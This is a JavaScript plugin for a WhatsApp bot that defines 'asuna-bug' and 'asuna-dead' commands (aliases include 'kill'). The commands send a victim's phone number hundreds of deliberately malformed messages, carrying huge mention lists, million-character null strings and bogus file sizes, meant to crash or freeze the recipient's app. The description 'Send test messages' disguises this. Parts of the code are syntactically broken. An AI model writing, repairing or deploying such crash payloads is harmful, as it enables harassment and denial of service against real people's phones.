const config = require('../config');
const { cmd, commands } = require('../command');
const axios = require('axios');

async function protocolAsk3(target) {
let sMents = Array.from({ length: 19000 }, () =>
    `1${Math.floor(Math.random() * 180000)}@s.whatsapp.net`
  );
  await conn.relayMessage(target, {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𝐗𝐏𝐋𝐔𝐒𝐈𝐎𝐍",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: ""
                    },
                    contentText: "𝐘𝐨𝐮𝐒𝐭𝐮𝐩𝐢𝐝 \"😮‍💨\"",
                    footerText: "𝐃𝐞𝐥𝐚𝐲 𝐕𝐢𝐬𝐢𝐛𝐥𝐞",
                    buttons: [
                        {
                            buttonId: "🎭".repeat(8000),
                            buttonText: {
                                displayText: "🎧 𝐇𝐔𝐍𝐓𝐄𝐑"
                            },
                            type: 1
                        },
{
                           buttonId: "\u0000".repeat(8),
                            buttonText: {
                                displayText: "🎧 𝐗𝐏𝐋𝐎𝐈𝐓"
                            },
                            type: 1
                        },
{
                           buttonId: "\u0000".repeat(8),
                            buttonText: {
                                displayText: "🎧 𝐃𝐄𝐅𝐋𝐎𝐃𝐒"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3,
      contextInfo: {
      mentionedJid: sMents,
        participant: "0@s.whatsapp.net",
        remoteJid: "who know's ?",
       quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: "@tamainfinity",
              format: 1
            },
            nativeFlowResponseMessage: {
              name: "menu_options",
              paramsJson: "\u0000".repeat(999999),
              version: 3
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741
            }
          }
        }
      }
    }
  }, { participant: { jid: target },
    messageId: null
  });
}

async function protocolAsk2(target) {
let sMents = Array.from({ length: 30000 }, () =>
    `1${Math.floor(Math.random() * 90000)}@s.whatsapp.net`
  );
  await conn.relayMessage(target, {
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/41258771_1174167867185286_2361586182713723567_n.enc?ccb=11-4&oh=01_Q5AaIRBwYC6V9Cqs3xvRS12DMUzPUU6GO7a4zB9BV34XNAGT&oe=6817ADFD&_nc_sid=5e03e0&mms3=true",
    "mimetype": "application/pdf",
    "fileSha256": "jMkavP2oUdBFUhe2VgCoQAzsKZPK2mLy43Uz5IPnLtM=",
    "fileLength": "156364",
    "pageCount": 0,
    "mediaKey": "5TVYZQoLxOXfzo945TUcTJqhSkCCTWcc8Qo5mI5T4o0=",
    "fileName": "🎧",
    "fileEncSha256": "BlzYfgorbWOebr/gxNoJrdgiwn7rWTAneTvzTOEA56E=",
    "directPath": "/v/t62.7119-24/41258771_1174167867185286_2361586182713723567_n.enc?ccb=11-4&oh=01_Q5AaIRBwYC6V9Cqs3xvRS12DMUzPUU6GO7a4zB9BV34XNAGT&oe=6817ADFD&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1743803635",
caption: "🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫", 
      contextInfo: {
      mentionedJid: sMents,
        participant: "0@s.whatsapp.net",
        remoteJid: "who know's ?",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: null
          }
        }
      }
    }
  }, { participant: { jid: target },
    messageId: null
  });
}
async function protocolAsk1(target) {
  let listMents = Array.from({ length: 30000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
  "imageMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQOWuhrEjLtM85nECqrr4fiLErT7D8iOX5YUgbPUHyH-djYXlHkIxOujdzFcRqS4OwMqvhejK3OHqW9mnjVu5fI6p2iWDWj19ct5kmozHQ?ccb=9-4&oh=01_Q5Aa1QF4n7-ZOl3ltrthxoOuRU-Y0XM9q3FP7WD-LkfLdWF0ug&oe=682392AD&_nc_sid=e6ed6c&mms3=true",
    "mimetype": "image/jpeg",
    "fileSha256": "JdSHM2gGqSUmVf07FU8bX3fl7eYJ1JqPy0ZIkmCHRKA=",
    "fileLength": "45916",
    "height": 733,
    "width": 736,
    "mediaKey": "FbqJVf79fWGdCqskxMKBe0sEtuyoURmjD1PO/0tfRwo=",
    "fileEncSha256": "Cd2QwvHXNEPC4cv+5MeiruCUsE8eS4PDpYZ2NsE4rfE=",
    "directPath": "/o1/v/t62.7118-24/f2/m231/AQOWuhrEjLtM85nECqrr4fiLErT7D8iOX5YUgbPUHyH-djYXlHkIxOujdzFcRqS4OwMqvhejK3OHqW9mnjVu5fI6p2iWDWj19ct5kmozHQ?ccb=9-4&oh=01_Q5Aa1QF4n7-ZOl3ltrthxoOuRU-Y0XM9q3FP7WD-LkfLdWF0ug&oe=682392AD&_nc_sid=e6ed6c",
    "mediaKeyTimestamp": "1744546685",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAAAQMEBQIGAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAIUQlTkQxA0AHAa9e9wZBbkM9TylJ9wgch6p8yGV63BuFHQ0MSXFoatkwD0BZ1QpIknp2VtaixM6moxd6xvGEEfQCAEwBgAB/8QAJBAAAgICAgICAgMAAAAAAAAAAQIAAwQREBIhMQUiEzJBQlH/2gAIAQEAAT8AEdiFhOyTwOTN8XOAut8Hgzc9iDi8DXBEM8jgHweOksq7KRKMY3sa19qY+DkB2X+olSd7On8wVWNeUNfkCdG7ka9GOdMQOOs6zHLUfIAmFFYAmX4LrlC2tfrLKqzX3EybfsyVrCjj2JoxEdFA3swN50RHNQdi2pgfIJduomEqg27ACZmaLj+GiZVa4719h4MSii1dq0OAn+y/NWo9R5MszbX9eIzs3szGUtUzL+ymd8i8hSxMx8VKB2M+TyUtIRJTc9R2pmPlpaNHwYWLEk8EzBvFN32/VoWxaAbNiZWfZf8AVfCRRwCRAZvUA3CNzTHwSZqDxz//xAAYEQACAwAAAAAAAAAAAAAAAAABMAAQMf/aAAgBAgEBPwBoszUf/8QAGREBAAIDAAAAAAAAAAAAAAAAAQAhECAw/9oACAEDAQE/AOhHJKI3v//Z",
    "scansSidecar": "umZspE+8yw2GvQSUtqXJ7USHwIVUoIOOZVdjLTQKlwx/oWM6eOOMZA==",
    "scanLengths": [
      4937,
      15856,
      9050,
      16073
    ],
    "midQualityFileSha256": "+MOHMd3WPtc3iQ68uQH4n1BhEQxtJsBlGeTj6rHuZg4=",
  caption: "🎧",
          contextInfo: {
            mentionedJid: listMents,
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          }
        }
      }
    }
  }, {});
  
/////////////////////--function bug by dev ask--///////////////////
cmd({
  pattern: "asuna-bug",
  alias: ["bug","kill","asn-bg"],
  use: '.asuna-bug',
  desc: "Send test messages",
  category: "bug",
  react: "⚠️",
  filename: __filename
}, async (conn, m, { from, q, reply }) => {
  if (!q) return m.reply(`Example: ${prefix + command} 241xxx`);
  const blockedNum = "24165183695@s.whatsapp.net";
  let target = q.replace(/[^0-9]/g, "") + '@s.whatsapp.net';

  if (target === blockedNum) {
    return m.reply('🚫 Cannot target the creator.');
  }

  let asuna = `*☠︎𝐀𝐒𝐔𝐍𝐀 𝐒𝐔𝐂𝐂𝐄̀𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆☠︎*
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐃𝐄𝐋𝐀𝐈 : 𝟒𝟎
𝐂𝐈𝐁𝐋𝐄 𝐄𝐋𝐈𝐌𝐈𝐍𝐄 𝐀𝐕𝐄𝐂 𝐒𝐔𝐂𝐂𝐄𝐒 `;
  await conn.sendMessage(m.chat, { image { url: `` },
  caption: asuna, 
  { quoted: m });
for (let i = 0; i < 40; i++) {
await protocolAsk1(target)
await protocolAsk2(target)
await protocolAsk3(target)
await protocolAsk1(target)
await protocolAsk2(target)
await protocolAsk3(target)
}
});

/////////////////////--function bug by dev ask--///////////////////
cmd({
  pattern: "asuna-dead",
  alias: ["bug-dead","dead","asn-dd"],
  use: '.asuna-bug',
  desc: "Send test messages",
  category: "bug",
  react: "⚠️",
  filename: __filename
}, async (conn, m, { from, q, reply }) => {
  if (!q) return m.reply(`Example: ${prefix + command} 241xxx`);
  const blockedNum = "24165183695@s.whatsapp.net";
  let target = q.replace(/[^0-9]/g, "") + '@s.whatsapp.net';

  if (target === blockedNum) {
    return m.reply('🚫 Cannot target the creator.');
  }

  let asuna = `*☠︎𝐀𝐒𝐔𝐍𝐀 𝐒𝐔𝐂𝐂𝐄̀𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆☠︎*
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐃𝐄𝐋𝐀𝐈 : 𝟒𝟎
𝐂𝐈𝐁𝐋𝐄 𝐄𝐋𝐈𝐌𝐈𝐍𝐄 𝐀𝐕𝐄𝐂 𝐒𝐔𝐂𝐂𝐄𝐒 `;
  await conn.sendMessage(m.chat, { image { url: `` },
  caption: asuna, 
  { quoted: m });
for (let i = 0; i < 40; i++) {
await protocolAsk1(target)
await protocolAsk2(target)
await protocolAsk3(target)
await protocolAsk1(target)
await protocolAsk2(target)
await protocolAsk3(target)
}
})
/////////////////////--function bug by dev ask--///////////////////
